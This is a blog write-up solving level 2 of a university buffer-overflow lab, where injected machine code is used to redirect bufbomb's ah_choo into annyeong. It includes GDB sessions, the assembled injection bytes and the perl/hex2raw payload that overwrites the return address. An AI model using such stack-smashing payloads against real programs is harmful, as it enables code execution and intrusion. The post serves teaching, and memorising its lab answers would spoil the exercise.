---
title: 'Level 2. Hi~'
date: 2016-07-09
permalink: /posts/2016/07/bufflab-level-2/
tags:
  - computer organization and architecture
  - buffer lab
  - assembly
  - hi~
---

Primary purpose:

We have to give an input such that after calling function **ah_choo()** program won't return to procedure **test()**, yet it'll go to procedure **annyeong()**. Here's the C code for procedure **annyeong()**.
 
> int Hi = 0;<br />
> void annyeong(int val) {<br />
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (Hi == cookie) {<br />
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("OK: Hi 0x%x\n", Hi);<br />
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {<br />
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("NO: Hi 0x%x\n", Hi);<br />
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(0);<br />
> }<br />

Ok, now let's see what procedure **annyeong()** does. Open your terminal and go to the directory where **bufbomb** file resides and type this command:

> gdb bufbomb<br />
> (gdb) disas annyeong<br />

**Dump of assembler code for function annyeong:**

Address | Operation | Elements in operation
--- | --- | ---
0x08048bf3 <+0>:  |  sub  |  $0x1c, %esp
0x08048bf6 <+3>:  |  mov  |  0x804d104, %eax
0x08048bfb <+8>:  |  cmp  |  0x804d10c, %eax
0x08048c01 <+14>: |  jne  |  0x8048c32 <annyeong+63>
0x08048c03 <+16>: |  cmpl |  $0xffffffff, 0x804d100
0x08048c0a <+23>: |  jne  |  0x8048c32 <annyeong+63>
0x08048c0c <+25>: |  mov  |  %eax, 0x8(%esp)
0x08048c10 <+29>: |  movl |  $0x804a237, 0x4(%esp)
0x08048c18 <+37>: |  movl |  $0x1, (%esp)
0x08048c1f <+44>: |  call |  0x8048900 <__printf_chk@plt>
0x08048c24 <+49>: |  movl |  $0x2, (%esp)
0x08048c2b <+56>: |  call |  0x8049171 <validate>
0x08048c30 <+61>: |  jmp  |  0x8048c4a <annyeong+87>
0x08048c32 <+63>: |  mov  |  %eax, 0x8(%esp)
0x08048c36 <+67>: |  movl |  $0x804a244, 0x4(%esp)
0x08048c3e <+75>: |  movl |  $0x1, (%esp)
0x08048c45 <+82>: |  call |  0x8048900 <__printf_chk@plt>
0x08048c4a <+87>: |  movl |  $0x0, (%esp)
0x08048c51 <+94>: |  call |  0x8048850 <exit@plt>

**End of assembler dump.**

From above Assembly code we can see that register %eax is fully occupied by the contents of memory address 0x804d104. Then the contents of register %eax is compared with the contents of memory address 0x804d10c. The result of comparison must be equal so that the program can execute the next Assembly code normally. Then what's the contents of address 0x804d104 and 0x804d10c?

By using GDB, use this command:

> (gdb) x/ 0x804d104<br />
> 0x804d104 < Hi >:    0<br />
> (gdb) x/ 0x804d10c<br />
> 0x804d10c < cookie >:    0<br />

Evidently, the contents of address 0x804d104 is the value of global variable **Hi** which is now worth 0. Afterwards, the contents of address 0x804d10c is our cookie which is now worth 0. Why is the value 0? For we haven't execute the bufbomb program. Ok, so we have gotten these important information:

> * Address of procedure **annyeong()**: 0x08048bf3.<br />
> * The contents of address 0x804d104 equals to the contents of global variable Hi (0) which is moved into register %eax.<br />

Now, let's take a look at the next Assembly code of procedure **annyeong()**.

**Dump of assembler code for function annyeong:**

Address | Operation | Elements in operation
--- | --- | ---
0x08048bf3 <+0>:  |  sub   | $0x1c, %esp
0x08048bf6 <+3>:  |  mov   | 0x804d104, %eax
0x08048bfb <+8>:  |  cmp   | 0x804d10c, %eax
0x08048c01 <+14>: |   jne  |  0x8048c32 <annyeong+63>
0x08048c03 <+16>: |   cmpl |  $0xffffffff, 0x804d100
0x08048c0a <+23>: |   jne  |  0x8048c32 <annyeong+63>
0x08048c0c <+25>: |   mov  |  %eax, 0x8(%esp)
0x08048c10 <+29>: |   movl |  $0x804a237, 0x4(%esp)
0x08048c18 <+37>: |   movl |  $0x1, (%esp)
0x08048c1f <+44>: |   call |  0x8048900 <__printf_chk@plt>
0x08048c24 <+49>: |   movl |  $0x2, (%esp)
0x08048c2b <+56>: |   call |  0x8049171 <validate>
0x08048c30 <+61>: |   jmp  |  0x8048c4a <annyeong+87>
0x08048c32 <+63>: |   mov  |  %eax, 0x8(%esp)
0x08048c36 <+67>: |   movl |  $0x804a244, 0x4(%esp)
0x08048c3e <+75>: |   movl |  $0x1, (%esp)
0x08048c45 <+82>: |   call |  0x8048900 <__printf_chk@plt>
0x08048c4a <+87>: |   movl |  $0x0, (%esp)
0x08048c51 <+94>: |   call |  0x8048850 <exit@plt>

**End of assembler dump.**

After filling register %eax with the contents of global variable **Hi**, the next step is to check whether the contents of register %eax is the same with our cookie. If not, the program will issue an error message. The conclusion is the contents of register %eax must be same with our cookie. So how do we change the contents of register %eax? Simply put, we can only just change the contents of address 0x804d104 into our cookie (0x1d9ed824).

Afterwards, the program will re-check **cmpl $0xffffffff, 0x804d100** whether the contents of address 0x804d100 is equal to a constant 0xffffffff or not. If not, the program will issue an error message. So how do we change it so that the value is equal to the constant? The step is similar to the previous explanation, namely we only change the contents of 0x804d100.

Ok, now we'll simplify what we need to do on this level:

> 1. Change the contents of address 0x804d104 into our cookie (0x1d9ed824).<br />
> 2. Change the contents of address 0x804d100 into a constant 0xffffffff.<br />

To change the contents of an address, we can't just directly do the thing through user input. As both of addresses aren't located within the stack, we need to inject codes where the contents is also Assembly code. 

So, open your text editor and type this Assembly code:

> movl $0x1d9ed824, 0x804d104<br />
> movl $0xffffffff, 0x804d100<br />
> pushl $0x08048bf3<br />
> ret<br />

The first row of the above code shows us that it'll change the contents of address 0x804d104 into a constant 0x1d9ed824 which is our cookie value.

The second row of the above code shows us that it'll change the contents of address 0x804d100 into a constant 0xffffffff.

The third row of the above code shows us that it'll insert an address 0x08048bf3 into the stack so that after the calling process for function **ah_choo()** is finished, the program will be directly returning to address 0x08048bf3 where it's an address of procedure **annyeong()**. 

Afterwards, please save that file with your chosen name (the file extension is **s**). In this case, I named it with **assemblylvl2.s**.

Now let's compile of code. Use this command:

> gcc -m32 -c assemblylvl2.s<br />
> objdump -d assemblylvl2.o > assemblylvl2.d<br />
> cat assemblylvl2.d<br />

It'll give this result:

Compiled code: | | |
--- | --- | ---
assemblylvl2.o:     file format elf32-i386 | | 
Disassembly of section .text: | | 
00000000 <.text>: | | 
0:    c7 05 04 d1 04 08 24   |  movl  |  $0x1d9ed824,0x804d104
7:    d8 9e 1d               | | 
a:    c7 05 00 d1 04 08 ff   |   movl |  $0xffffffff,0x804d100
11:    ff ff ff              | | 
14:    68 f3 8b 04 08        |   push |  $0x8048bf3
19:    c3                    |   ret | 

Then, use GDB again and give a free input. In this case I gave **A** character as much as 9 times as the input. 

> gdb bufbomb<br />
> (gdb) b ah_choo<br />
> Breakpoint 1 at 0x8048cec<br />
> (gdb) run -u eksperimen<br />
> Userid: eksperimen<br />
> Cookie: 0x1d9ed824<br />
> Masukkan input:<br />
> Breakpoint 1, 0x08048cec in ah_choo ()<br />
> (gdb) ni<br />
> 0x08048cef in ah_choo ()<br />
> (gdb) ni<br />
> 0x08048cf3 in ah_choo ()<br />
> (gdb) ni<br />
> 0x08048cf6 in ah_choo ()<br />
> (gdb) ni<br />
> AAAAAAAAA<br />
> 0x08048cfb in ah_choo ()<br />

Then type this command:

> (gdb) x/20x $esp<br />

The contents of stack | | | |
--- | --- | --- | --- | 
0x55683638 <_reserved+1037880>:  |  0x55683650  |  0x00000000  |  0x55685ff0  |  0xf7e467d4
0x55683648 <_reserved+1037896>:  |  0xf7fba3cc  |  0x55683664  |  0x41414141  |  0x41414141
0x55683658 <_reserved+1037912>:  |  0x00000041  |  0xf7fba3cc  |  0xf7fbb898  |  0x2a031223
0x55683668 <_reserved+1037928>:  |  0x00000000  |  0xf7fd6000  |  0x00000000  |  0x08048db7
0x55683678 <_reserved+1037944>:  |  0x000010aa  |  0x0000000a  |  0x00000000  |  0x08048d0c

Still remember the location of return address of function **ah_choo()**? Just use this command in case you forgot.

> (gdb) disas ah_shoo<br />

**Dump of assembler code for function ah_shoo:**

Address | Operation | Elements in operation
--- | --- | ---
0x08048d04 <+0>:  |  sub   | $0xc, %esp
0x08048d07 <+3>:  |  call  | 0x8048cec <ah_choo>
0x08048d0c <+8>:  |  add   | $0xc, %esp
0x08048d0f <+11>: |   ret  |

**End of assembler dump.**

From the above code, we can see that function **ah_shoo()** calls function **ah_choo()** and the return address of **ah_choo()** is 0x08048d0c. Let's find 0x08048d0c in the stack frame of function **ah_choo()**. Yap it's found at the very bottom row. This return address will be manipulated later.
 
After the function **ah_choo()** was finished,, the program will directly return to the address stored on the block of return address, where in this case the return address after function **ah_choo()** was finished is 0x08048d0c. Therefore, we'll change that return address so that after calling function **ah_choo()**, the program will execute our own instruction.
 
Then, what should be changed from that return address?

We'll change that return address so that the program will be redirected to the instruction written in the code injection created previously.
 
Then, where's the starting address of our code injection? The starting address is free, we can configure it by ourselves. For example, in this case I will insert that code after the block containing return address of procedure **annyeong()**. So, the type of my string input is 52 characters (free), an address of procedure **annyeong()**, and a hexadecimal code for our code injection.

To do that, quit from GDB and type this command: 

> * perl -e 'print "61 "x32, "62 "x20, "f3 8b 04 08 ", "c7 05 04 d1 04 08 24 d8 9e 1d c7 05 00 d1 04 08 ff ff ff ff 68 f3 8b 04 08 c3"' > hex0<br />
> * ./hex2raw < hex0 > raw0<br />

Afterwards, use GDB again and type this command:

> gdb bufbomb<br />
> (gdb) b annyeong<br />
> Breakpoint 1 at 0x8048bf3<br />
> (gdb) run -u eksperimen < raw0<br />
> Userid: eksperimen<br />
> Cookie: 0x1d9ed824<br />
> Masukkan input:<br />
> Breakpoint 1, 0x08048bf3 in annyeong ()<br />
> (gdb) c<br />
> Continuing.<br />
> NO: Hi 0x0<br />
> [Inferior 1 (process 4396) exited normally]<br />

Why do we fail? It's fail as from out string input we gave the return address of procedure **annyeong()** after the free 52 characters. The effect is after the program was finished in reading that 52 characters, it won't execute our code injection, yet directly return to procedure **annyeong()**. So, the solution is we've to change the contents of block after our 52 characters so that the program can read our code injection. Need to remember that from our code injection we had already given a command that after changing the contents of 2 memory addresses, we should directly insert he address of procedure **annyeong()** which will make the program redirects the flow into procedure **annyeong()** after the function **ah_choo()** was finished.

Then, where's the address of our code injection? The location is one block above the block containing that return address.

Quit from GDB and type this command:

> * perl -e 'print "61 "x32, "62 "x19' > hex0<br />
> * ./hex2raw < hex0 > raw0<br />

Then go back into GDB and use this command:

> (gdb) b ah_choo<br />
> Breakpoint 1 at 0x8048cec<br />
> (gdb) run -u eksperimen < raw0<br />
> Userid: eksperimen<br />
> Cookie: 0x1d9ed824<br />
> Masukkan input:<br />
> Breakpoint 1, 0x08048cec in ah_choo ()<br />

Then look at the contents of function **ah_choo()**.

> (gdb) disas<br />

**Dump of assembler code for function ah_choo:**

Address | Operation | Elements in operation
--- | --- | ---
=> 0x08048cec <+0>: | sub  |  $0x4c, %esp
0x08048cef <+3>:  |  lea   | 0x18(%esp), %eax
0x08048cf3 <+7>:  |  mov   | %eax, (%esp)
0x08048cf6 <+10>: |   call |  0x8048c56 <Gets>
0x08048cfb <+15>: |   mov  |  $0x1, %eax
0x08048d00 <+20>: |   add  |  $0x4c, %esp
0x08048d03 <+23>: |   ret  |

**End of assembler dump.**

Continue with these command:

> (gdb) ni<br />
> 0x08048cef in ah_choo ()<br />
> (gdb) ni<br />
> 0x08048cf3 in ah_choo ()<br />
> (gdb) ni<br />
> 0x08048cf6 in ah_choo ()<br />
> (gdb) ni<br />
> 0x08048cfb in ah_choo ()<br />

After we give 4 **ni** instructions, use this command to see the contents of stack frame of function **ah_choo()**.

> (gdb) x/30x $esp<br />

The contents of stack | | | |
--- | --- | --- | --- |
0x55683638 <_reserved+1037880>:  |  0x55683650  |  0x00000000  |  0x55685ff0  |  0xf7e467d4
0x55683648 <_reserved+1037896>:  |  0xf7fba3cc  |  0x55683664  |  0x61616161  |  0x61616161
0x55683658 <_reserved+1037912>:  |  0x61616161  |  0x61616161  |  0x61616161  |  0x61616161
0x55683668 <_reserved+1037928>:  |  0x61616161  |  0x61616161  |  0x62626262  |  0x62626262
0x55683678 <_reserved+1037944>:  |  0x62626262  |  0x62626262  |  0x00626262  |  0x08048d0c
0x55683688 <_reserved+1037960>:  |  0x0000000f  |  0xf7fba000  |  0x0000000f  |  0x08048dcd
0x55683698 <_reserved+1037976>:  |  0xf7fbaac0  |  0x0000000a  |  0x0000000f  |  0xf7e12700
0x556836a8 <_reserved+1037992>:  |  0x55685ff0  |  0xf7ff0500  |              |

From the above stack's contents, we can see that one block above the block containing return address (0x08048d0c) is a block with address 0x55683688 and contains 0x0000000f. We'll change the value 0x08048d0c into 0x55683688 so that after function **ah_choo()** was finished in reading our 52 characters, the program will execute the instructions on a block at 0x55683688. The contents of that block is our code injection!

Quit from GDB, just remember the address of block (0x55683688) and type this command:

> * perl -e 'print "61 "x32, "62 "x20, "88 36 68 55 ", "c7 05 04 d1 04 08 24 d8 9e 1d c7 05 00 d1 04 08 ff ff ff ff 68 f3 8b 04 08 c3"' > hex0<br />
> * ./hex2raw < hex0 > raw0<br />

We can see that after our 52 characters, we inserted address 0x55683688 in the form of Little Endian. Now, type this command on GDB:

> gdb bufbomb<br />
> (gdb) b annyeong<br />
> Breakpoint 1 at 0x8048bf3<br />
> (gdb) run -u eksperimen < raw0<br />
> Userid: eksperimen<br />
> Cookie: 0x1d9ed824<br />
> Masukkan input:<br />
> Breakpoint 1, 0x08048bf3 in annyeong ()<br />
> (gdb) disas<br />

**Dump of assembler code for function annyeong:**

Address | Operation | Elements in operation
--- | --- | ---
=> 0x08048bf3 <+0>:  |  sub  |  $0x1c, %esp
0x08048bf6 <+3>:  |  mov   | 0x804d104, %eax
0x08048bfb <+8>:  |  cmp   | 0x804d10c, %eax
0x08048c01 <+14>: |   jne  |  0x8048c32 <annyeong+63>
0x08048c03 <+16>: |   cmpl |  $0xffffffff, 0x804d100
0x08048c0a <+23>: |   jne  |  0x8048c32 <annyeong+63>
0x08048c0c <+25>: |   mov  |  %eax, 0x8(%esp)
0x08048c10 <+29>: |   movl |  $0x804a237, 0x4(%esp)
0x08048c18 <+37>: |   movl |  $0x1, (%esp)
0x08048c1f <+44>: |   call |  0x8048900 <__printf_chk@plt>
0x08048c24 <+49>: |   movl |  $0x2, (%esp)
0x08048c2b <+56>: |   call |  0x8049171 <validate>
0x08048c30 <+61>: |   jmp  |  0x8048c4a <annyeong+87>
0x08048c32 <+63>: |   mov  |  %eax, 0x8(%esp)
0x08048c36 <+67>: |   movl |  $0x804a244, 0x4(%esp)
0x08048c3e <+75>: |   movl |  $0x1, (%esp)
0x08048c45 <+82>: |   call |  0x8048900 <__printf_chk@plt>
0x08048c4a <+87>: |   movl |  $0x0, (%esp)
0x08048c51 <+94>: |   call |  0x8048850 <exit@plt>

**End of assembler dump.**

> (gdb) ni<br />
> 0x08048bf6 in annyeong ()<br />
> (gdb) ni<br />
> 0x08048bfb in annyeong ()<br />
> (gdb) ni<br />
> 0x08048c01 in annyeong ()<br />
> (gdb) ni<br />
> 0x08048c03 in annyeong ()<br />
> (gdb) ni<br />
> 0x08048c0a in annyeong ()<br />

After 5 times running this instruction, type this command:

> (gdb) i r<br />

Info register | | |
--- | --- | ---
eax       |     0x1d9ed824  |  496949284
ecx       |     0xf7fbb8a4  |  -134498140
edx       |     0xa  |  10
ebx       |     0x0  |  0
esp       |     0x5568366c  |  0x5568366c <_reserved+1037932>
ebp       |     0x55685ff0  |  0x55685ff0 <_reserved+1048560>
esi       |     0x3  |  3
edi       |     0x0  |  0
eip       |     0x8048c0a   |  0x8048c0a <annyeong+23>
eflags    |     0x246  |  [ PF ZF IF ]
cs        |     0x23   | 35
ss        |     0x2b   | 43
ds        |     0x2b   | 43
es        |     0x2b   | 43
fs        |     0x0   |  0
gs        |     0x63  |  99

See? The contents of register %eax has been changed into our cookie (0x1d9ed824). This means the contents of address 0x804d104 has also changed into our cookie. Let's prove it.

Type this command:

> (gdb) x/ 0x804d104<br />
> 0x804d104 < Hi >:    496949284<br />
> (gdb) p/x 496949284<br />
> $2 = 0x1d9ed824<br />

Our intuition was right, the contents of address 0x804d104 has changed. How about the contents of address 0x804d100?

Type this command:

> (gdb) x/ 0x804d100<br />
> 0x804d100 < Hihi >:    0xffffffff<br />

Yap! It also has changed. From those values we can assure that we've already been on the right track. To finish this level, type this command:

> (gdb) c<br />
> Continuing.<br />
> OK: Hi 0x1d9ed824<br />
> VALID<br />
> Selamat!<br />
> [Inferior 1 (process 4581) exited normally]<br />

YESSS!!! Come on, get the last one done!
